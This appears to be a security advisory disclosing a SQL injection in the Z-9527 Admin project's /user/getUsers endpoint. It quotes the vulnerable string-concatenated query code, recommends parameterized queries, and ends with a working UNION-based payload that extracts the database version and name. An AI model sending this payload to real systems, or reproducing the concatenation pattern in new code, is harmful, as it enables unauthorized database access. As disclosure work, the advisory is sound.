# SQL Injection Vulnerability in Z-9527 Admin

> **Software and Affected Version:** [Z-9527 Admin](https://github.com/z-9527/admin) ≤ commit 72aaf2d

## Affected Files

-   `/server/routes/user.js`
-   `/server/controller/user.js`

## Description

A SQL injection vulnerability exists in [Z-9527 Admin](https://github.com/z-9527/admin) ≤ commit 72aaf2d at the `/user/getUsers` endpoint, where the `startTime` query parameter is concatenated directly into a SQL statement without sanitization or parameterization. As a result, authenticated attackers can perform UNION-based SQL injection attacks, bypass the original query logic, and retrieve sensitive information from the database. The leaked data is reflected directly in the JSON response fields. Mitigations include immediately replacing string concatenation with parameterized queries or prepared statements, implementing strict input validation and sanitization for all user-supplied parameters, applying the principle of least privilege to database connections, deploying web application firewalls with SQL injection detection rules, and conducting comprehensive security audits of all database query construction patterns across the codebase.

## Code Analysis

In `/server/routes/user.js`:

```js
router.get('/getUsers', async function (ctx, next) {
    const res = await getUsers(ctx.query);
    handleRes(ctx, next, res);
});
```

In `/server/controller/user.js`:

```js
const getUsers = async (param) => {
    const { current = 0, pageSize = 10, username, startTime, endTime } = param;
    let sql = `select SQL_CALC_FOUND_ROWS ${usersColumns.join(',')} from users where registrationTime between ${
        startTime || 0
    } and ${endTime || Date.now()} `;
    if (username) {
        sql += `and username like '%${username}%' `;
    }
    sql += `order by registrationTime desc limit ${current * pageSize},${pageSize}`;
    const res = await exec(sql);
    const sql2 = 'select found_rows() as total';
    const res2 = await exec(sql2);
    return new SuccessModel({
        data: {
            list: res,
            current: parseInt(current),
            pageSize: parseInt(pageSize),
            total: res2[0].total
        }
    });
};
```

The user input is directly concatenated into the SQL statement.

## Proof of Concept

Sending a request to `/user/getUsers` with the `startTime` parameter set to the following payload allows for the extraction of the database version and the current database name:

```plain
0 and 0 UNION SELECT 1,2,3,4,5,6,7,8,9,10,VERSION(),DATABASE() --
```

![](./assets/sqli.png)
